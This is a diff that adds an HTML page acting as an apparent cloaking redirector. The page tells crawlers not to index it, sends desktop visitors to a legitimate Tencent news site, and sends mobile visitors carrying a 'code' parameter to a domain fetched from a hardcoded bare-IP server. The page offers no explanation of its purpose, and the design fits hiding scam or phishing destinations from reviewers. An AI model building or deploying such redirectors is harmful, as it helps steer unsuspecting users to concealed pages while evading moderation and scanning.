@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title></title>
+    <meta name="robots" content="none"/>
+    <meta name="Baiduspider" content="noindex,nofollow"/>
+    <meta name="Sosospider" content="noindex,nofollow"/>
+    <meta name="sogou spider" content="noindex,nofollow"/>
+    <meta name="360Spider" content="noindex,nofollow"/>
+    <meta name="YodaoBot" content="noindex,nofollow"/>
+    <meta name="Googlebot" content="noindex,nofollow"/>
+    <meta name="MicroMessenger" content="noindex,nofollow"/>
+    <meta name="QQBrowser" content="noindex,nofollow"/>
+    <meta content=yes name=apple-mobile-web-app-capable>
+    <meta name="viewport" content="width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+    <script src="https://s3.pstatp.com/cdn/expire-1-M/jquery/3.3.1/jquery.min.js"></script>
+</head>
+
+<body>
+<script>
+    function isMobile() {
+        var userAgentInfo = navigator.userAgent;
+        var mobileAgents = ["Android", "iPhone", "SymbianOS", "Windows Phone", "iPad", "iPod"];
+        var mobile_flag = false;
+        for (var v = 0; v < mobileAgents.length; v++) {
+            if (userAgentInfo.indexOf(mobileAgents[v]) > 0) {
+                mobile_flag = true;
+                break;
+            }
+        }
+        var screen_width = window.screen.width;
+        var screen_height = window.screen.height;
+        if (screen_width > 325 && screen_height < 750) {
+            mobile_flag = true;
+        }
+        return mobile_flag;
+    }
+
+    function getUrlParams(key) {
+        var url = window.location.search.substr(1);
+        if (url === '') {
+            return false;
+        }
+        var paramsArr = url.split('&');
+        for (var i = 0; i < paramsArr.length; i++) {
+            var combina = paramsArr[i].split("=");
+            if (combina[0] === key) {
+                return combina[1];
+            }
+        }
+        return false;
+    }
+
+    function insertLog(types) {
+        return new Promise((resolve) => {
+            $.post("http://49.0.229.122:9100/h5/insertLog", {types: types}, function (res) {
+                resolve(res);
+            }, 'json');
+        });
+    }
+
+    function getDomain(types) {
+        return new Promise((resolve) => {
+            $.get("http://49.0.229.122:9100/h5/getDomain", {}, function (res) {
+                resolve(res);
+            }, 'json');
+        });
+    }
+
+    function jump() {
+        let code = getUrlParams("code");
+        if (code) {
+            let timer = setTimeout(function () {
+                getDomain().then((data) => {
+                    if (data.code === 200) {
+                        let url = data.domain + "/gomod.html?code=" + code;
+                        window.location.replace(url);
+                    } else {
+                        console.log("参数错误");
+                    }
+                });
+            }, 1000);
+        } else {
+            window.location.href = 'http://xw.qq.com';
+        }
+    }
+
+    if (isMobile()) {
+        jump();
+    } else {
+        window.location.href = 'http://xw.qq.com';
+    }
+</script>
+</body>
+</html>
